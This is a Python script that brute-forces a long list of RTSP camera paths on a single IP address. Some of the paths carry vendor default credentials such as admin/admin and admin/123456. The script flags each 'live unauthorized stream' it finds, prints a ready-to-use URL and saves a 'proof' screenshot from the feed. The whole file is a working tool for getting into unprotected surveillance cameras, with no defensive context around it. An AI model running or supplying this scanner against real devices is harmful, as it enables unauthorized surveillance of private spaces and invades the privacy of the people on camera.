import cv2
import sys

def scan_ip(ip, port=554):
    paths = [
        "/live.sdp", "/stream1", "/stream2", "/cam1/h264", "/cam1/mpeg4", "/cam1/mjpeg",
        "/video", "/video1", "/video2", "/video3", "/video4", "/h264", "/h265", "/mpeg4", "/mjpeg",
        "/media", "/media1", "/media2", "/live", "/live1", "/live2", "/ch0_0.h264", "/ch0_1.h264",
        "/ch01.h264", "/ch02.h264", "/main", "/sub", "/third", "/mobile", "/high", "/low",
        "/channel1", "/channel2", "/channel3", "/channel4", "/1", "/2", "/3", "/4", "/5", "/6",
        "/7", "/8", "/9", "/10", "/11", "/12", "/13", "/14", "/15", "/16", "/", "",
        "/Streaming/Channels/101", "/Streaming/Channels/102", "/Streaming/Channels/201",
        "/Streaming/Channels/202", "/Streaming/Channels/301", "/h264/ch1/main/av_stream",
        "/h264/ch1/sub/av_stream", "/h264/ch2/main/av_stream", "/h264/ch2/sub/av_stream",
        "/h265/ch1/main/av_stream", "/h265/ch1/sub/av_stream", "/h264/ch1/main", "/h264/ch1/sub",
        "/h264/ch2/main", "/h264/ch2/sub",
        "/cam1/h264", "/cam1/mpeg4", "/cam1/mjpeg", "/realmonitor?channel=1&subtype=0",
        "/realmonitor?channel=1&subtype=1", "/realmonitor?channel=2&subtype=0",
        "/realmonitor?channel=2&subtype=1", "/cam/realmonitor?channel=1&subtype=0",
        "/cam/realmonitor?channel=1&subtype=1", "/cam/realmonitor?channel=2&subtype=0",
        "/cam/realmonitor?channel=2&subtype=1", "/cgi-bin/mjpg/video.cgi?channel=1&subtype=0",
        "/cgi-bin/mjpg/video.cgi?channel=1&subtype=1",
        "/axis-media/media.amp", "/axis-media/media.amp?videocodec=h264",
        "/axis-media/media.amp?videocodec=mpeg4", "/axis-media/media.amp?videocodec=mjpeg",
        "/mjpg/video.mjpg", "/mjpg/1/video.mjpg", "/mpeg4/media.amp",
        "/live/ch00_0", "/live/ch00_1", "/live/ch01_0", "/live/ch01_1",
        "/rtsp_tunnel", "/h264?fp=0&stream=1", "/h264?fp=0&stream=2",
        "/mpeg4?fp=0&stream=1", "/mpeg4?fp=0&stream=2", "/mjpeg?fp=0&stream=1",
        "/profile1/media.smp", "/profile2/media.smp", "/h264/media.smp",
        "/mpeg4/media.smp", "/mjpeg/media.smp",
        "/media/video1", "/media/video2", "/media/video3", "/media/video1/h264",
        "/media/video2/h264", "/media/video1/mpeg4", "/media/video2/mpeg4",
        "/live.sdp", "/live/mpeg4.sdp", "/live/h264.sdp",
        "/live.sdp?user=admin&passwd=&channel=1&stream=0.sdp",
        "/live.sdp?user=admin&passwd=&channel=1&stream=1.sdp",
        "/videoMain", "/videoSub", "/cgi-bin/CGIStream.cgi?cmd=GetMJStream",
        "/cgi-bin/CGIStream.cgi?cmd=GetH264Stream",
        "/play1.sdp", "/play2.sdp", "/mpeg4", "/h264", "/mjpeg", "/video.cgi",
        "/mjpeg.cgi", "/h264_stream", "/mjpeg_stream",
        "/onvif/media_service", "/onvif/live/1", "/onvif/live/2", "/onvif/live/3", "/onvif/live/4",
        "/user=admin_password=admin_channel=1_stream=0.sdp?real_stream",
        "/user=admin_password=12345_channel=1_stream=0.sdp?real_stream",
        "/user=admin_password=123456_channel=1_stream=0.sdp?real_stream",
        "/user=admin_password=888888_channel=1_stream=0.sdp?real_stream",
        "/user=admin_password=000000_channel=1_stream=0.sdp?real_stream",
        "/cgi-bin/snapshot.cgi", "/cgi-bin/video.cgi", "/cgi-bin/mjpg/video.cgi",
        "/jpg/image.jpg", "/snap.jpg", "/snapshot.jpg", "/image.jpg", "/capture.jpg",
        "/getimage", "/getframe"
    ]

    MAX_STREAMS = 3
    print(f"\n[*] Starting brute-force scan on {ip}:{port}...")
    print(f"[*] Testing up to {len(paths)} paths (stops after {MAX_STREAMS} streams found)...\n")

    found_streams = []

    for i, path in enumerate(paths):
        if len(found_streams) >= MAX_STREAMS:
            print(f"\n[+] Reached max of {MAX_STREAMS} streams. Stopping early.")
            break
            
        url = f"rtsp://{ip}:{port}{path}"
        print(f"[{i+1}/{len(paths)}] Testing: {path}", end=" ... ")
        
        try:
            cap = cv2.VideoCapture(url, cv2.CAP_FFMPEG)
            cap.set(cv2.CAP_PROP_OPEN_TIMEOUT_MSEC, 4000)
            cap.set(cv2.CAP_PROP_READ_TIMEOUT_MSEC, 4000)
            
            if cap.isOpened():
                ret, frame = cap.read()
                if ret and frame is not None:
                    print("\nSUCCESS! (Live unauthorized stream found)")
                    found_streams.append(url)
                    
                    # PRINT COPY-PASTE READY URL
                    print(f"\n🔗 DIRECT STREAM URL:")
                    print(f"   {url}")
                    print("-" * 60)
                    
                    # Optional: Save proof screenshot
                    screenshot_name = f"proof_{ip}_{path.replace('/', '_').replace('?', '_')}.jpg"
                    cv2.imwrite(screenshot_name, frame)
                    print(f"    -> Screenshot saved as: {screenshot_name}")
                else:
                    print("Opened, but no frame (Auth required/dead)")
            else:
                print("Failed to open")
                
            cap.release()
        except Exception as e:
            print(f"Error: {e}")

    print(f"\n[+] Scan complete. Found {len(found_streams)} live streams on {ip}:")
    for stream in found_streams:
        print(f"    -> {stream}")

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python single_ip_scanner.py <IP_ADDRESS>")
        sys.exit(1)
    
    target_ip = sys.argv[1]
    scan_ip(target_ip)